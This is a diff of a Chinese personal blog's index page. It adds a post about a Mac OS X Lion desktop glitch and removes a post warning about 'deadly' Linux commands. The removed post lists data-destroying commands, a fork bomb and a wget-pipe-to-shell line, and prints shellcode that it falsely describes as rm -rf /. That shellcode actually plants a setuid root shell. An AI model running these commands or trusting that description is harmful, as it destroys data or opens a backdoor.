@@ -9,7 +9,7 @@
   <meta name="author" content="dawncold">
 
   
-  <meta name="description" content="&lt;p&gt;刚刚看到cnbeta上一篇关于flash在lion中cpu占用率很高的问题，我感觉这都不算什么问题了，以前就发现占用率相当高，看flash视频的时候电脑会非常热。&lt;/p&gt; 但这次说的不是这个问题，而是adobe提到的lion没有预置java，这点有些奇怪， &hellip;">
+  <meta name="description" content="&lt;p&gt;很奇怪的现象：我在桌面上放了一个文件，是用Bean生成的文本文件，接着从这个Desktop往下一个Desktop切换，但不完全切换，只需要看下一个Desktop内容的一点，然后再回到当前这个Desktop，就会发现桌面上的那个文件没了，但点击文件的位置仍然能够打开！！ &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -77,6 +77,43 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/07/22/lion-eat-my-file-on-desktop/">Lion吃了我的文件</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-07-22T07:28:00+08:00" pubdate data-updated="true">Jul 22<span>nd</span>, 2011</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><pre><code>        &lt;p&gt;很奇怪的现象：我在桌面上放了一个文件，是用Bean生成的文本文件，接着从这个Desktop往下一个Desktop切换，但不完全切换，只需要看下一个Desktop内容的一点，然后再回到当前这个Desktop，就会发现桌面上的那个文件没了，但点击文件的位置仍然能够打开！！这应该是一个相当大的bug吧？难道还能是一个专门给用户着想的地方？！&lt;/p&gt;
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -670,70 +707,6 @@ End Sub
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2011/07/12/7-deadly-command-on-linux/">看来的7条致命Linux命令</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2011-07-12T18:11:00+08:00" pubdate data-updated="true">Jul 12<span>th</span>, 2011</time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><pre><code>        &lt;pre class="prettyprint linenums bush:bash" lang="bash"&gt;1. rm -rf / 此命令将递归并强制删除 / 目录下的所有文件。
-</code></pre>
-
-<ol>
-<li></li>
-</ol>
-
-
-<p>char esp[] <strong>attribute</strong> ((section(“.text”))) /<em> e.s.p
-release </em>/
-= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
-“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
-“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
-“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
-“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
-“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
-“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
-“cp -p /bin/sh /tmp/.beyond; chmod 4755
-/tmp/.beyond;”;</p>
-
-<p>这是 rm -rf / 的 hex（十六进制）版本，很能迷惑 Linux 用户。
-3. mkfs.ext3 /dev/sda 这将对硬盘进行重新格式化，自然，硬盘上的所有数据将灰飞烟灭。
-4. : ( ){  : |:&amp; };: 著名的 fork bomp，此命令将告诉你的系统执行海量的进程，直到你的系统僵死。
-5. any_command &gt; /dev/sda 使用该命令，原始数据将被写到块设备，其结果是造成数据丢失。
-6. wget http://some_untrusted_source -O- | sh 不要从不信任的地方下载东西，这可能会获取恶意代码。
-7. mv /home/yourhomedirectory/* /dev/null 此命令将移动主目录中的所有文件到一个不存在的地方，你将再也看不到那些文件。</pre></p>
-
-<br /><p>我在Mac系统下试用了第四条奇怪的明令，没什么效果，看来Mac还稍微安全一点。其他的就不试了……</p>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/blog/page/15/">&larr; Older</a>
@@ -751,6 +724,10 @@ release </em>/
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2013/01/20/merge-partition-got-couldnt-modify-partition-map-because-file-system-verification-failed-error/">merge partition got Couldn’t modify partition map because file system verification failed error</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2013/01/03/gets-method-in-ruby/">gets method in ruby</a>
       </li>
     
@@ -764,10 +741,6 @@ release </em>/
     
       <li class="post">
         <a href="/blog/2012/11/25/thinking-convert-to-octopress-blog-system/">我在考虑迁移到octopress上</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2012/10/20/6-minutes-offset-in-pytz/">pytz的6分钟时差</a>
       </li>
     
   </ul>
